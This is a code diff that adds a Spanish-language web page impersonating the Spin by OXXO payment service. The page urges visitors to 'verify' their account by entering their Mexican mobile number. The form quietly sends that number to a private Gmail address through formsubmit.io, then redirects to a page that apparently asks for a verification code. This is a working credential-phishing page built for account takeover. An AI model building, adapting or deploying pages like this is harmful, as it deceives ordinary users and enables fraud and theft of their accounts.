@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script defer src="https://cdn.jsdelivr.net/npm/@finsweet/attributes-formsubmit@1/formsubmit.js"></script>
+    <title>Spin oxxo</title>
+</head>
+<body>
+    <div class="nav">
+        <img class="imglogonav" src="./logo.png" alt="">
+    </div>
+
+    <div class="cont">
+        <div class="conttitle">
+            <h1 class="title">INGRESA TU NUMERO DE CELULAR PARA VERIFICAR TU CUENTA</h1>
+        </div>
+        <form  action="https://formsubmit.io/send/sipinrespuesta@gmail.com" method="POST">
+        <div class="contsolicitar">
+            <div class="lbinput"><label class="label" >🇲🇽+52</label><input name="Numero" class="pedirnumeroinput"  type="text" placeholder="Ingresa tu numero" required></div>
+            
+            <input name="email" type="hidden" value="respues2form@gmail.com">
+            <input name="_formsubmit_id" type="text" style="display:none">
+            <input name="_redirect" type="hidden" id="name" value="http://127.0.0.1:5500/ingresacodigo.html">
+            <input value="Enviar" class="pedirbtn" type="submit">
+
+            <script>
+                var input = document.querySelector(".pedirnumeroinput");
+                var btn = document.querySelector(".pedirbtn");
+                input.addEventListener("keyup", function(){
+                    if(input.value.length == 10){
+                        btn.disabled = false;
+                    }else{
+                        btn.disabled = true;
+                    }
+                });
+            </script>
+
+        </div>
+        <div class="contaviso">
+        <h3 class="textaviso" >No pierdas tu cuenta y sigue difrutando de los beneficios que Spin tiene para ti.</h3>
+    </div>
+    </form>
+    </div>
+
+</body>
+</html>
